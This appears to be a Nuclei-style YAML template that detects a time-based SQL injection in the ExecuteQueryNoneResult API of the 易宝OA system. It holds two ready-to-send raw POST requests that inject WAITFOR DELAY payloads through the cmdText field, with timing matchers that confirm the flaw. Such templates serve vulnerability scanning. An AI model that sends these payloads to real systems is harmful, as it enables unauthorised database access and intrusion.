id: poc-yaml-yi-bao-oa-system-executequerynoneresult-sqli
info:
  name: 易宝OA系统 ExecuteQueryNoneResult SQL Injection
  author: ProjectDiscoveryAI
  severity: high
  tags: sql-injection
  description: |
    易宝OA系统 ExecuteQueryNoneResult endpoint is vulnerable to SQL Injection, allowing attackers to execute time-based SQL queries.

variables:
  t1: "{{rand_int(5, 9)}}"
  t2: "{{to_number(t1) + 2}}"
  t3: "{{rand_int(1, 4)}}"
  t4: "{{to_number(t3) + 2}}"

http:
  - raw:
      - |
        POST /api/system/ExecuteQueryNoneResult HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded

        token=zxh&cmdText=;WAITFOR DELAY '0:0:{{t1}}'--
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - "success"
          - "true"
      - type: word
        part: header
        words:
          - "application/json"
      - type: dsl
        dsl:
          - "duration > to_number(t1) && duration < to_number(t2)"

  - raw:
      - |
        POST /api/system/ExecuteQueryNoneResult HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded

        token=zxh&cmdText=;WAITFOR DELAY '0:0:{{t3}}'--
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - "success"
          - "true"
      - type: word
        part: header
        words:
          - "application/json"
      - type: dsl
        dsl:
          - "duration > to_number(t3) && duration < to_number(t4)"
